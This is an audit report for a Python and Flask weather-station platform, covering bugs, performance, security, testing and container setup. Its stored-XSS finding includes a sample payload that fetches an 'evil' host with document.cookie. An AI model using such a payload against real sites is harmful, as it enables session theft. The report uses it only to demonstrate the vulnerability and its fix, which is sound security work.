# Weather Station Simulator — Code Review, Audit & Improvement Plan

| | |
|---|---|
| **Project** | `weather-station` — distributed weather data ingestion platform |
| **Stack** | Python 3.11 · asyncio TCP server · NDJSON protocol · SQLite (WAL) · Flask + Chart.js · Docker Compose |
| **Review date** | 30 September 2026 |
| **Review type** | Full source audit — architecture, correctness, performance, security, testing, DevOps, documentation |
| **Codebase size** | ~2,150 lines of application code (Python / JS / CSS / HTML) + ~1,700 lines of Markdown docs |
| **Findings** | 14 confirmed bugs · 8 performance issues · 9 security findings · 11 code-quality issues · 6 DevOps issues · 6 documentation issues · 15 proposed features |
| **Method** | Full manual read of every source file, plus empirical reproduction of the highest-impact findings in isolated harnesses (see [Appendix A](#appendix-a--verification-methodology)) |

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Scorecard](#2-scorecard)
3. [What is already strong](#3-what-is-already-strong)
4. [Confirmed bugs](#4-confirmed-bugs)
5. [Performance](#5-performance)
6. [Security](#6-security)
7. [Code quality & architecture](#7-code-quality--architecture)
8. [Testing & CI — the biggest gap](#8-testing--ci--the-biggest-gap)
9. [DevOps & containerisation](#9-devops--containerisation)
10. [Documentation & repository hygiene](#10-documentation--repository-hygiene)
11. [Proposed features](#11-proposed-features)
12. [Prioritised roadmap](#12-prioritised-roadmap)
13. [Appendix A — verification methodology](#appendix-a--verification-methodology)
14. [Appendix B — file inventory](#appendix-b--file-inventory)
15. [Appendix C — quick reference: fixes by file](#appendix-c--quick-reference-fixes-by-file)

---

## 1. Executive summary

This is a genuinely competent systems project. The concurrency model, protocol design, validation discipline and Docker packaging are all above the typical student-project baseline, and the `architecture-decisions.md` document demonstrates the kind of engineering judgement that is genuinely worth hiring for.

However, in its current form the project has two structural problems that cap its value as a portfolio piece:

### Problem 1 — Nothing is verifiable

There are **zero automated tests**, no CI, and no coverage measurement. A stranger cannot verify a single claim in the 894-line architecture document without reading it and trusting it. `server/protocol.py` is a set of pure functions with no I/O — the ideal unit-test target in the entire codebase — and it has no tests. Meanwhile the manual harness `consumer_client/test_consumer.py` cannot run in CI because it requires an externally-started server.

### Problem 2 — The dashboard returns wrong data

Two independent correctness bugs in the web layer mean the UI shows something other than what is in the database:

- The **"Last N Values"** control returns the **oldest** N rows, not the newest.
- The **6h / 24h** time windows are offset by the host's UTC offset, so a "Last 6 hours" chart can show 9 hours of data.

Both are silent — no error, no warning, just plausible-looking wrong output. This is the most damaging category of bug for a portfolio, because a reviewer who tries the dashboard will draw the wrong conclusion about the quality of the work behind it.

### Problem 3 — Performance does not scale past the demo

The web API has **no indexes and no SQL-side filtering**. Every request performs a full table scan, materialises every row into Python, and discards ~99% of them. Measured at 300k rows: **207 ms per `/api/stats` call → 0.14 ms** with an index and a `WHERE`/`LIMIT` clause (≈1,500×). The schema also has no `NOT NULL` or `CHECK` constraints, so integrity depends entirely on Python-side validation.

### The good news

Roughly 60% of the available value is in **fixing bugs and adding tests, CI and observability** — not in new features. Phase 1 and Phase 2 of the [roadmap](#12-prioritised-roadmap) are estimated at three days and would transform how the project reads.

---

## 2. Scorecard

Scored 1–5, where 5 is "would pass a senior engineer's review unchanged".

| Area | Score | Summary |
|---|:--:|---|
| Architecture & concurrency design | ⭐⭐⭐⭐ | Single-writer queue is the right call for SQLite and is well argued. Global mutable state and duplicated write logic hold it back. |
| Protocol design | ⭐⭐⭐⭐ | NDJSON multiplexing of producer/consumer traffic on one port is a genuinely good idea. Validation is weaker than documented. |
| Input validation | ⭐⭐⭐ | Correct intent (NaN rejection, all-or-nothing, line limits) but timestamp validation accepts far more than specified, and the DB has no constraints. |
| Correctness | ⭐⭐ | Two silent data-correctness bugs in the web layer; idempotency claims are incorrect. |
| Performance | ⭐⭐ | Works at demo scale. No indexes, no SQL filtering, no backpressure despite the docs claiming otherwise. |
| Reliability & resilience | ⭐⭐⭐ | Good client-side backoff/buffering and graceful shutdown intent; several holes (unbounded queue, no write timeout, no idle timeout). |
| Security | ⭐⭐ | Unauthenticated by design (and honestly documented), but a stored XSS is exploitable and containers run as root. |
| Testing | ☆ | No automated tests at all. |
| DevOps | ⭐⭐ | Works, but obsolete syntax, project/volume name collisions, no log rotation, root containers, committed generated file. |
| Documentation | ⭐⭐⭐ | Exceptionally thorough in substance; broken in delivery (duplicate sections, dead links, encoding damage, missing files). |

**Overall: a strong 7/10 implementation presented as a 4/10 portfolio piece.** The gap is entirely in verification, correctness and presentation — not in engineering ability.

---

## 3. What is already strong

Do not remove any of this. Call it out explicitly in the README, because these are the parts a reviewer will be impressed by.

| Area | Evidence |
|---|---|
| **Concurrency model** | The single-writer `asyncio.Queue` (`server/app.py:65`) is the correct solution to SQLite write contention, and the reasoning is documented in `architecture-decisions.md` §5.2 and §5.4. |
| **Backpressure thinking** | Explicit trade-off analysis of the single-writer bottleneck, queue memory growth, and the "no per-client write ordering guarantee" limitation. |
| **Input validation depth** | `_safe_json_loads()` rejects `NaN`/`Infinity` via `parse_constant` (`server/app.py:33-41`); all-or-nothing batch semantics; `asyncio.LimitOverrunError` line-size guard (`server/app.py:311`) with a correctly configured `limit=MAX_LINE_SIZE + 1` (`server/app.py:421`). |
| **Graceful shutdown design** | Sentinel-based writer flush with a bounded 10 s timeout (`server/app.py:453-462`) and a `finally` block. Correct in intent. |
| **Client resilience** | Exponential backoff with jitter, bounded buffer, flush-on-reconnect, nested connect/send loops (`station_client/client.py:248-445`). |
| **Protocol multiplexing** | Producer batches (JSON arrays) and consumer requests (JSON objects with a `request` key) sharing one port with clean dispatch (`server/app.py:330-338`). |
| **Read/write concurrency thinking** | WAL mode, `synchronous=NORMAL`, `busy_timeout=3000` (`server/app.py:81-83`) — a correct and well-chosen combination. |
| **Documentation depth** | 894-line architecture document with Mermaid diagrams, per-decision "alternatives considered" sections, and an explicit limitations register. |
| **Reproducibility** | Scripted stress-compose generation, health-gated startup ordering, named volume persistence. |

---

## 4. Confirmed bugs

Every finding in this section was **empirically reproduced**, not inferred from reading alone. Severity reflects user-visible impact and likelihood of being discovered by a reviewer.

### Legend

| Severity | Meaning |
|---|---|
| 🔴 **Critical** | Security vulnerability, or silently wrong data shown to users |
| 🟠 **High** | Correctness or scalability defect that will surface under normal use |
| 🟡 **Medium** | Reliability or data-integrity issue under specific conditions |
| ⚪ **Low** | Code-quality, hygiene or cosmetic issue |

---

### B1 🔴 Stored XSS in the dashboard — `web/static/app.js:42-44`

**Location**

```js
select.innerHTML = stations
    .map(s => `<option value="${s}">${s}</option>`)
    .join('');
```

**Problem.** `station_id` is fully attacker-controlled. The server validates only that it is a non-empty `str` — `server/protocol.py:95-98` enforces no character set and no length limit. Any producer that can reach port 12345 can store a payload that executes in **every viewer's** browser, on every page load, until the rows are deleted.

```json
{"station_id": "\"><img src=x onerror=fetch('//evil/'+document.cookie)>",
 "timestamp": "2025-01-17T14:30:45Z",
 "temperature": 22.5, "humidity": 58.3, "windspeed": 4.2}
```

**Why it is critical.** The dashboard is the only component exposed on a published port, and a reviewer running the demo with untrusted data on the network is the exact threat model.

**Fix.** Never build DOM from string interpolation. Use the DOM API, which treats the value as text:

```js
select.replaceChildren(...stations.map(s => new Option(s, s)));
select.value = stations[0];
```

Apply the same treatment to `renderTable()` (`app.js:320-330`) and add `textContent` assertions anywhere else user data reaches the DOM. Additionally, constrain `station_id` at the protocol layer to `^[A-Za-z0-9_-]{1,64}$` — defence in depth, and it is a reasonable constraint for a real station ID anyway.

---

### B2 🟠 "Last N values" returns the OLDEST N — `web/web.py:288-297`

**Location**

```python
cursor = conn.execute(f"""
    SELECT timestamp, {db_metric}
    FROM readings
    WHERE station_id = ?
    ORDER BY timestamp ASC        # ascending...
""", (station_id,))
rows = cursor.fetchall()
# ...
for row in rows:
    if use_limit and count >= max_records:
        break                     # ...then take the FIRST N
```

**Problem.** The UI control is labelled **"Last N Values"** (`web/templates/index.html:30`). Ascending order plus a `break` returns the oldest N rows in the table, not the newest.

**Reproduction** (10 rows at 1-minute intervals, limit 3):

```
UI promises:  12:07, 12:08, 12:09   (newest three)
actually got: 12:00, 12:01, 12:02   (oldest three)
```

**Compounding factor.** `api_stats` uses `ORDER BY timestamp DESC` (`web.py:186`) and is therefore correct. The two sibling endpoints **disagree with each other**, and `/api/readings` — the one that feeds the chart — is the broken one.

**Fix.**

```python
rows = conn.execute(
    f"SELECT timestamp, {db_metric} FROM readings "
    "WHERE station_id = ? AND timestamp >= ? "
    "ORDER BY timestamp DESC LIMIT ?",
    (station_id, cutoff_iso, max_records),
).fetchall()
points = [{"t": r["timestamp"], "v": r[db_metric]} for r in reversed(rows)]
```

Also covers B4 and part of B3. **Add a regression test.**

---

### B3 🟠 6h/24h windows are wrong by the host's UTC offset — `web/web.py:173, 280`

**Location**

```python
def parse_timestamp(ts):                      # line 85
    dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
    return dt.replace(tzinfo=None)            # UTC value, timezone stripped
...
cutoff = datetime.now() - VALID_RANGES[time_range]   # line 173 / 280
```

**Problem.** The server stores UTC ISO-8601 strings. `parse_timestamp` strips the timezone, producing a naive UTC datetime. The cutoff is computed from `datetime.now()`, which is **naive local time**. The two are only comparable if the host runs in UTC.

**Reproduction** (host at UTC+3):

```
UTC now (naive)   = 2026-09-29 21:57
local now (naive) = 2026-09-30 00:57
skew              = +3.00 h
a reading exactly 23h old in UTC -> silently EXCLUDED from the "24h" window
```

**Impact.** The "Last 6 hours" chart shows 9 hours of data. Readings near the window edge appear and disappear unpredictably. This affects both the chart (`api_readings`) and every statistic card (`api_stats` avg/min/max).

**Fix.** One-line change in both endpoints, plus removing the `replace(tzinfo=None)` from `parse_timestamp`:

```python
cutoff = datetime.now(timezone.utc) - VALID_RANGES[time_range]
```

**Add a regression test** that freezes the clock and asserts window boundaries.

---

### B4 🟠 No indexes anywhere — `server/app.py:51-60`

**Problem.** The `readings` table is created with no indexes. `architecture-decisions.md:373` acknowledges this ("No indexes: For simplicity") but the consequences are not quantified anywhere.

**Measured query plan** (200k rows):

```
SCAN readings
USE TEMP B-TREE FOR ORDER BY
```

Every dashboard query is a full scan plus a sort.

**Fix.** One line, added to `init_database()`:

```sql
CREATE INDEX IF NOT EXISTS idx_readings_station_ts
    ON readings(station_id, timestamp DESC);
```

The `station_id` filter plus `timestamp DESC` ordering both become index-satisfied, eliminating the temp B-tree.

---

### B5 🟠 Every web query is a full table scan with in-Python filtering — `web/web.py:181-190, 288-297`

**Problem.** Combined with B4:

1. No index (B4).
2. **No time filter in SQL** — the `cutoff` is computed but only applied in a Python `for` loop.
3. **No `LIMIT`** — every row for the station is materialised.
4. ~99% of those rows are then discarded in Python.

**Measured** (300,000 rows for one station):

```
rows materialised per /api/stats call : 300,000
current behaviour                    :  207.0 ms
indexed + WHERE + LIMIT 500          :    0.14 ms     (≈1,500x faster)
```

**Projected real-world impact.** The stress profile is 100 stations at 1 reading/s. After 24 hours that is ~86,000 rows *per station* — 8.6M rows overall. At the measured rate each dashboard poll degrades steadily and never recovers, because nothing is ever deleted. The README's own troubleshooting entry ("Stress Test Hangs or Slows Down", §11) is this bug, misdiagnosed as a general performance ceiling.

**Fix.** Push filtering, ordering and limiting into SQL. See the snippet in B2. This also makes the in-Python `parse_timestamp` loop unnecessary on the hot path, removing a per-row `datetime.fromisoformat` call.

---

### B6 🟠 Timestamp validation accepts far more than documented — `server/protocol.py:23-38`

**Problem.** `datetime.fromisoformat()` is a permissive parser. The README (§9.1) and architecture document (§4.2) both specify *"ISO 8601 format with Z suffix or explicit timezone offsets"*. Measured acceptance:

| Input | Result | Should be |
|---|---|---|
| `2025-01-17T14:30:45Z` | accepted, tz-aware | ✅ accepted |
| `2025-01-17T14:30:45+05:30` | accepted, tz-aware | ✅ accepted |
| `2025-01-17T14:30:45` | **accepted, naive** | ❌ rejected |
| `2025-01-17` | **accepted, date only** | ❌ rejected |
| `20250117` | **accepted, basic format** | ❌ rejected |

**Two distinct downstream consequences:**

**(a) Naive timestamps break the UTC assumption.** `architecture-decisions.md:666` states *"Timestamps are UTC or have consistent offset"* — but the validator permits timestamps with no offset at all, and `web.py` strips offsets before comparing. A single naive row silently corrupts every subsequent time-range calculation.

**(b) Mixed offsets break lexicographic ordering.** `web.py` sorts with `ORDER BY timestamp` on a TEXT column. This is only correct for a fixed-width UTC format. Since non-zero offsets are accepted, ordering is wrong — reproduced:

```
web.py  ORDER BY timestamp ASC :  14:00Z, 15:00Z, 16:40+02:00
correct order by UTC instant  :  14:00Z, 16:40+02:00, 15:00Z
--> correct? False
```

`architecture-decisions.md:542` flags this risk but understates it: it is not a theoretical concern, it is reachable with any input the validator accepts today.

**Fix — two parts.**

1. Tighten validation: require a timezone, reject date-only and basic formats, bound the offset.
2. **Add a numeric sort key.** This is the durable fix and also solves B5's ordering requirement:

```sql
ALTER TABLE readings ADD COLUMN ts_ms INTEGER;   -- epoch milliseconds, UTC
CREATE INDEX idx_readings_station_ts ON readings(station_id, ts_ms DESC);
```

Sort and range-filter on the integer; keep an ISO string for display only. Numeric comparison is both correct and faster.

---

### B7 🟠 `write_queue` is unbounded — contradicts the project's own documentation

**Location** — `server/app.py:407`

```python
write_queue = asyncio.Queue()      # no maxsize
```

**Problem.** `architecture-decisions.md:329` asserts:

> *"Backpressure: The queue naturally applies backpressure. If the writer is slow, the queue fills up, and slow clients get enqueued behind fast ones."*

**This is not what happens.** An unbounded `asyncio.Queue` never blocks `put()`. There is no backpressure whatsoever. If the writer stalls — slow disk, volume full, checkpoint stall, an fsync that hangs — the queue grows until the container is OOM-killed, taking all buffered producer data with it. The backpressure described in the docs exists only in the client's local buffer, which is a different mechanism at a different layer.

**Fix.**

```python
QUEUE_MAXSIZE = int(os.getenv("WRITE_QUEUE_MAX", "10000"))
write_queue = asyncio.Queue(maxsize=QUEUE_MAXSIZE)
```

and instrument the saturation event:

```python
try:
    await asyncio.wait_for(write_queue.put(item), timeout=WRITE_ENQUEUE_TIMEOUT)
except asyncio.TimeoutError:
    return {"status": "error", "code": "backpressure", "retry_after": 1}
```

Queue depth then becomes a first-class exported metric (see F1), which turns the documented backpressure into a *measured* property.

---

### B8 🟠 `enqueue_batch()` can block a client forever

**Location** — `server/app.py:180-202`

```python
await write_queue.put((batch, result_future))
return await result_future          # no timeout
```

**Problem.** If the writer task dies — disk full, database corruption, an exception that escapes the `try` — the future is never resolved. Every connected producer waits on `readline()` indefinitely, holds a connection, a task and a 64 KB buffer, and never times out. A single writer failure turns into a total, silent outage.

**Fix.** Bound the wait and fail retryably:

```python
return await asyncio.wait_for(result_future, timeout=WRITE_ACK_TIMEOUT)
```

with `WRITE_ACK_TIMEOUT` surfaced as a configuration value and a `write_ack_timeout_total` counter exported to metrics.

---

### B9 🟡 One OS thread per consumer request

**Location** — `server/app.py:220, 234, 264`

```python
async with aiosqlite.connect(DB_FILE) as db:
    await db.execute("PRAGMA busy_timeout=3000;")
```

**Problem.** `aiosqlite` is **thread-per-connection**: each `connect()` spawns and joins a dedicated worker thread. Opening a fresh connection per consumer request means 50 concurrent consumer requests create 50 threads, each of which must additionally re-run the PRAGMA setup. There is no bound on concurrency here at all.

**Fix.** A bounded read pool, or a small fixed set of long-lived reader connections with a semaphore:

```python
READ_POOL_SIZE = int(os.getenv("READ_POOL_SIZE", "4"))
read_sem = asyncio.Semaphore(READ_POOL_SIZE)
```

Document in the architecture decision why reads get a pool while writes stay single-writer — the asymmetry is the interesting part and currently goes unexplained.

---

### B10 🟡 Client buffer cap is 1000 *batches*, not 1000 *readings*

**Location** — `station_client/client.py:32, 385, 423`

```python
DEFAULT_MAX_BUFFER_RECORDS = 1000     # "records"
...
if len(buffer) < max_buffer_records:  # len(buffer) counts BATCHES
```

**Problem.** `buffer` is a `deque` of batches. With `--batch-max 50` the documented 1,000-reading cap is actually **50,000 readings**. The mismatch appears in three places:

| Location | Claim |
|---|---|
| `README.md` §12 | "buffers unsent batches (drops oldest when buffer full)" |
| `architecture-decisions.md:431` | "local deque buffer (max 1000 readings)" |
| `architecture-decisions.md:465` | "1000 readings at 5s intervals = 83 minutes" — actually 5.7 days at batch size 5 |

**Impact.** Silent divergence between documented and actual memory bounds. On a memory-constrained edge device (the realistic deployment target for a weather station) this is the difference between 1 MB and 50 MB of retained data.

**Fix.** Track records, not batches:

```python
buffer_records = sum(len(b) for b in buffer)   # or maintain a counter
```

A monotonic counter incremented on append and decremented on pop is O(1); the `sum()` is O(n) and would run on every batch.

---

### B11 🟡 Duplicate readings on retry — the idempotency claim is incorrect

**Location** — `server/app.py:51-60` (no uniqueness constraint)

**Problem.** `architecture-decisions.md:466` claims:

> *"Duplicate readings on reconnect: ... Mitigation: server should be idempotent (it **is**; batches are appended, no duplicates in the sense of primary key conflicts)."*

This is not idempotency. "No primary key conflict" means duplicates are silently *accepted*. Reproduced — the same measurement sent twice yields:

```
rows for 1 measurement : 2
```

**When it happens.** `client.py:322-325` — if the batch is written and drained but the ACK is lost or slow, `asyncio.wait_for(reader.readline(), timeout=response_timeout)` raises, the batch is re-buffered (`client.py:385`), and the reconnect path re-sends it. Under the stress profile (100 stations, 5 s response timeout) this is not rare.

**Fix.** See F6 for the complete solution — a per-station sequence number with a uniqueness constraint gives idempotency, gap detection and replay together. The minimal version:

```sql
UNIQUE(station_id, ts_ms)
-- and
INSERT OR IGNORE INTO readings (...)
```

---

### B12 🟡 `web` service has no health condition on `depends_on` — `docker-compose.yml:114-115`

**Location**

```yaml
web:
  depends_on:
    - server          # no condition — unlike the three station services
```

**Problem.** The three station clients correctly use `condition: service_healthy` (`docker-compose.yml:46-48`). The web service does not, so it can start before the server has created the database.

`get_db()` calls `sqlite3.connect(str(DB_PATH))` (`web.py:80`), and **`sqlite3.connect` creates the file if it does not exist**. On the read-only volume mount (`docker-compose.yml:109`) this raises; if the mount were writable it would silently create an empty database. Either way `/api/stations` returns `{"stations": []}` and the dashboard shows its "No stations or data available yet" empty state — which the README attributes to waiting 15–30 s for the first batches (§7.3).

**This is a second-order bug in `detect_wind_column()` too** (`web.py:44-68`): on the first failure it caches the `"windspeed"` fallback into the module-level `_wind_column_cache` and **never retries**, so even a later successful connection keeps the assumed value.

**Fix.**

```yaml
web:
  depends_on:
    server:
      condition: service_healthy
```

Additionally: open the database with `mode=ro` so a missing file is a loud error rather than a silent empty database, and stop caching the column-detection fallback on failure.

---

### B13 🟡 Internal exception text is returned to clients

**Location** — `server/app.py:374-376` (and `:291`)

```python
response = {"status": "error", "reason": f"server_error: {str(e)}"}
```

**Problem.** Raw exception text crosses the network boundary. Depending on the driver, this can disclose filesystem paths, table structure, or SQL fragments. The `except` block in `handle_consumer_request` (`:289-291`) has the same issue.

**Fix.** Log the detail server-side, return a stable code plus a correlation id, and echo that id back so a user can quote it and you can find the traceback.

```python
trace_id = uuid4().hex[:12]
logger.exception("unhandled error trace_id=%s", trace_id)
return {"status": "error", "code": "internal", "trace_id": trace_id}
```

---

### B14 ⚪ Additional defects

| # | Issue | Location | Fix |
|---|---|---|---|
| a | **SIGTERM produces an asyncio traceback and non-zero exit.** `server.close()` cancels `serve_forever()`'s future, raising `CancelledError`; `except KeyboardInterrupt` (`:442`) does not catch it, so it propagates out of `asyncio.run`. Visible on every `docker compose down`. | `app.py:438-443` | `except (KeyboardInterrupt, asyncio.CancelledError): pass` |
| b | **Health check is a bare TCP connect.** Spawns a full `handle_client` task, allocates a 64 KB read buffer, and writes two log lines every 30 s — noise already documented in `docs/temp_findings.md`. | `docker-compose.yml:24` | Implement `{"request":"health"}`; see F12 |
| c | **Dead configuration.** `WEATHER_STATION_MAX_RETRIES=3` is set in both Dockerfiles and both compose files but is never read by `client.py`. `SERVER_HOST`/`SERVER_PORT` are set in compose but **hardcoded** at `app.py:19-20` — README §12 documents them as configurable, which is false. | compose + Dockerfiles | Either wire them up or delete them |
| d | **No `TCP_NODELAY`.** Nagle's algorithm plus delayed ACK can add ~40 ms per round trip. On a strict request/response protocol where every batch waits for an ACK, this is a real latency cost. | `app.py:417`, `client.py:301` | `sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)` |
| e | **No idle or read timeout on connections.** `await reader.readline()` (`app.py:310`) can block indefinitely. A client that connects and never sends holds a task and a buffer open forever — free resource exhaustion. | `app.py:306-320` | `asyncio.wait_for(reader.readline(), timeout=CONN_IDLE_TIMEOUT)` |
| f | **`conn.close()` is not in a `finally`.** Any exception between `connect()` and `close()` leaks the connection. | `web.py:113, 191, 297` | `with contextlib.closing(get_db()) as conn:` or Flask `g`-scoped teardown |
| g | **Client shutdown can be delayed by up to 60 s.** The `shutdown` flag is only checked between `asyncio.sleep()` calls, and `max_backoff` is 60 s. Docker SIGKILLs at 10 s, so the in-memory buffer is lost. | `client.py:413` | `asyncio.Event` + `wait_for`, plus a SIGTERM flush path |
| h | **Buffering-while-disconnected loop is arithmetically wrong.** With `wait_time=1.0` and `batch_interval=5.0` the loop runs once and generates nothing; with larger values it generates at most one batch per retry cycle, regardless of elapsed time. | `client.py:412-429` | Decouple generation from backoff entirely — see F10 |
| i | **No `NOT NULL` or `CHECK` constraints.** Integrity depends entirely on Python-side validation; a direct DB write bypasses every rule. | `app.py:51-60` | Add `NOT NULL` and `CHECK` constraints as defence in depth |
| j | **`AUTOINCREMENT` is unnecessary overhead.** It forces an extra `sqlite_sequence` table and slows every insert. `INTEGER PRIMARY KEY` provides identical behaviour for this use case. | `app.py:53` | Drop `AUTOINCREMENT` |
| k | **`async with` on aiosqlite connections is relied upon for closing.** Correct in current aiosqlite, but subtle and version-sensitive. | `app.py:220` etc. | Prefer an explicit `try/finally: await db.close()` |

---

## 5. Performance

| # | Issue | Location | Impact | Fix |
|---|---|---|---|---|
| P1 | Full table scan + no SQL filtering | `web.py:181-190, 288-297` | **207 ms → 0.14 ms** measured at 300k rows | B2/B5 fix |
| P2 | No indexes | `app.py:51-60` | Full scan + temp B-tree sort | B4 fix |
| P3 | `print()` per batch **on the event loop** | `app.py:353` | ~10k synchronous stdout writes/min at stress profile; blocks the loop | `logging` with `QueueHandler`; sample per-station |
| P4 | One thread per consumer request | `app.py:220, 234, 264` | Unbounded thread growth | B9 fix |
| P5 | `wait_for(queue.get(), timeout=1.0)` | `app.py:90` | Allocates a timer every loop iteration | `queue.get()` + sentinel only |
| P6 | Flask development server in the production image | `web/Dockerfile:24` | Not a production WSGI server | `gunicorn` with explicit workers |
| P7 | No `Cache-Control` on `/api/*` | `web.py` | Identical data refetched on every render | `Cache-Control: max-age=5` + ETag |
| P8 | `VALID_RANGES` limited to `6h`/`24h` | `web.py:24-27` | Cannot view recent detail or longer history | Add `1h`/`7d`/`30d` once F3 (rollups) exists |

**Optional, measurable win.** Install `uvloop` and benchmark against the stock loop. Publishing the delta (typically 1.5–2× on this workload) is a cheap, credible performance result for the README.

---

## 6. Security

| # | Finding | Severity | Fix |
|---|---|---|---|
| S1 | Stored XSS via `station_id` in `innerHTML` | 🔴 | B1 fix — `new Option()` / `textContent`, plus protocol-level charset constraint |
| S2 | No authentication on TCP or HTTP | 🟠 | Pre-shared token via a `{"request":"hello","token":…}` handshake; `itsdangerous`-signed session for the web tier |
| S3 | No TLS on either transport | 🟠 | Terminate TLS at a proxy, or document the trust boundary explicitly |
| S4 | No rate limiting | 🟠 | Per-connection token bucket; exponential penalty then close |
| S5 | Unbounded connections, unbounded queue, unbounded consumer threads | 🟠 | B7, B9, B14e — three independent resource-exhaustion vectors |
| S6 | Internal exception text returned to clients | 🟡 | B13 fix |
| S7 | Containers run as **root** | 🟡 | `RUN useradd -r app && USER app` in all three Dockerfiles |
| S8 | Stale pinned dependencies | 🟡 | `Flask==3.0.0` (Apr 2023) and `aiosqlite==0.19.0`; no lockfile with hashes, no Dependabot |
| S9 | Chart.js loaded from CDN without SRI | ⚪ | Vendor locally — also makes the demo work offline |

**On S2 and S3.** The project already lists *"No authentication/TLS on sockets or web UI"* as a limitation, which is honest and appropriate. But for a portfolio, **stating** the gap is worth far less than **closing** it and writing the threat model. A ~40-line token handshake plus a short `docs/SECURITY.md` covering assets, trust boundaries, threats and mitigations would be a strong differentiator — it demonstrates security thinking rather than security awareness.

---

## 7. Code quality & architecture

| # | Issue | Location | Recommendation |
|---|---|---|---|
| C1 | **Module-level mutable globals** — `write_queue`, `shutdown_event`, `server`, `writer_task`, `db_connection` are all `global`-mutated across four functions | `app.py:22-27` | Wrap in `class WeatherServer` with instance state and methods. Single-handedly this makes the server unit-testable without patching module globals. |
| C2 | **Verbatim duplicated insert block** — identical `executemany` + `commit` + future-resolution logic appears twice | `app.py:105-125` and `:150-168` | Extract `_insert_batch(conn, batch, future)`. ~35 lines → ~8. |
| C3 | **`validate_batch` is 90 lines of repetitive field checks** | `protocol.py:56-143` | Table-driven: `RANGES = {"temperature": (-10, 40), "humidity": (0, 100), "windspeed": (0, 50)}` with one loop. ~88 → ~35 lines, and adding a fourth metric becomes a one-line change. |
| C4 | **`api_stats` and `api_readings` are ~90% duplicate** | `web.py:121-326` | One `_query_series(station, metric, range, limit)` helper returning rows; each endpoint formats its own response. |
| C5 | **No type hints anywhere** | all files | Add them. They pay for themselves immediately in the C1–C4 refactors. |
| C6 | **Server uses `print()`, not `logging`** | `app.py` throughout | No levels, no timestamps, no request correlation, no configurable format. Under the stress profile this is also P3. |
| C7 | **Fragile f-string SQL interpolation** | `web.py:183, 290` | Safe only because of the `VALID_METRICS` allowlist — and the allowlist validates the *UI* name, not the resolved *DB column*. Validate the final identifier explicitly. |
| C8 | **Dead code: `parse_timestamp` float fallback** | `web.py:92-95` | The server only ever writes ISO-8601 (enforced by `validate_timestamp`). Unreachable. |
| C9 | **Dead code: `detect_wind_column()`** | `web.py:44-68` | Defends against a schema the server fully controls. Replace with a migration (F14) and delete. |
| C10 | **Fragile `_wind_column_cache` global** | `web.py:39` | Module-level mutable cache with no invalidation; poisons itself on first failure (B12). |
| C11 | **No `pyproject.toml`** | — | No shared tooling config. Ruff, mypy and pytest settings are duplicated per service or absent. Single source of truth. |

---

## 8. Testing & CI — the biggest gap

### Current state

**Zero automated tests.** Specifically:

- No `pytest`, no `conftest.py`, no fixtures, no coverage measurement.
- `consumer_client/test_consumer.py` is a hand-rolled `print`-based script that **requires an externally started server**, so it cannot run in CI. It is a useful manual smoke test, not a test suite.
- `consumer_client/test_api.py` is referenced in `README.md` §10 **and** in `docs/explanation/INDEX.md`, but **the file does not exist**.
- No CI workflow, no linter, no formatter, no pre-commit hooks.

### Why this is the highest-value work

`server/protocol.py` is pure functions with zero I/O — the ideal unit-test target in the codebase — and it has no tests. Meanwhile the bugs in §4 are all trivially testable. A test suite converts every architectural claim in `architecture-decisions.md` from *assertion* into *evidence*, which is precisely the gap identified in the executive summary.

### Recommended plan

**1. Test harness**

```
pytest · pytest-asyncio · httpx · ruff · mypy
```

An in-process server fixture writing to a `tmp_path` database. No Docker required — the whole suite runs in under a second.

**2. `protocol.py` unit tests (~45 cases) — highest ROI in the entire review**

- Every range boundary: `-10`, `40`, `0`, `100`, `50`, and one step outside each
- `bool` rejection for all three metrics (`True` is a subclass of `int`)
- `NaN` / `Infinity` / `-Infinity` via both the JSON parser and direct calls
- `None`, `str`, `list`, `dict` in place of each numeric field
- Missing field for each of the 5 required fields
- Empty `station_id`, non-string `station_id`
- **Every malformed timestamp from B6** — naive, date-only, basic format, out-of-range offset
- Batch size 0, 1, 50, 51
- Non-list batches: `dict`, `str`, `int`, `None`
- Non-dict items inside the batch
- All-or-nothing semantics: 49 valid + 1 invalid must reject the whole batch

**3. Integration tests**

- Batch → ACK → `{"request":"latest"}` round trip
- Concurrent producers writing simultaneously (exercises the single-writer queue)
- Graceful shutdown flushes queued writes
- `line_too_long` returns `line_too_long` and closes the connection
- Partial-batch rejection inserts zero rows
- Consumer requests on the same connection as a producer batch (multiplexing)
- Client reconnect and buffer flush (F10)

**4. Web tests** — Flask test client

- **B2 regression:** "last N" returns the newest N
- **B3 regression:** window boundaries with a frozen clock
- Metric allowlist rejects unknown metrics
- `limit` and `range` are mutually exclusive
- Missing database returns an empty list, not a 500

**5. CI — GitHub Actions**

```yaml
strategy:
  matrix: { python-version: ["3.11", "3.12", "3.13"] }
steps:
  - ruff check .
  - mypy server station_client web
  - pytest --cov=server,station_client,web --cov-report=xml
  - docker compose config -q          # catches compose syntax errors
  - docker build ./server ./web ./station_client
```

**6. README badge** — a coverage badge at the top converts the entire exercise into visible evidence.

---

## 9. DevOps & containerisation

| # | Issue | Detail | Fix |
|---|---|---|---|
| D1 | **Obsolete Compose schema version** | `version: '3.8'` prints a deprecation warning on every command with Compose v2 | Delete the line |
| D2 | **Project name collision between compose files** | Both declare `container_name: weather-server` and `weather-web` → **the demo and stress stacks cannot run simultaneously** | Add `name: weather-demo` and `name: weather-stress` |
| D3 | **Volume name collision** | Both use `weather-data` → in the same project they resolve to the same volume, so **stress data contaminates the demo database** | Per-stack volume names |
| D4 | **2,082-line generated compose file committed to the repo** | 100 near-identical service blocks; the single largest file in the repository | Delete it and use the hostname trick below |
| D5 | **`container_name` blocks `--scale`** | Cannot run `docker compose up --scale station-001=20` | Remove `container_name` entirely |
| D6 | **No `.dockerignore`** | Build context includes `__pycache__`, `.venv`, `data/`, docs | Add per service |
| D7 | **No `stop_grace_period`** | The writer flush path needs 10 s (`app.py:459`); Docker's default SIGKILL grace is *exactly* 10 s → race, silent data loss | `stop_grace_period: 20s` |
| D8 | **No log rotation** | `json-file` grows unbounded while the server logs a line per batch (P3) | `driver: json-file, options: {max-size: 10m, max-file: 3}` |
| D9 | **No runtime hardening** | Containers run as root with full capabilities and no resource limits | `read_only`, `cap_drop: [ALL]`, `security_opt: [no-new-privileges:true]`, `mem_limit`, `cpus` |
| D10 | **Development WSGI server in the production image** | `python web.py` runs Flask's dev server | `gunicorn` with explicit worker count |
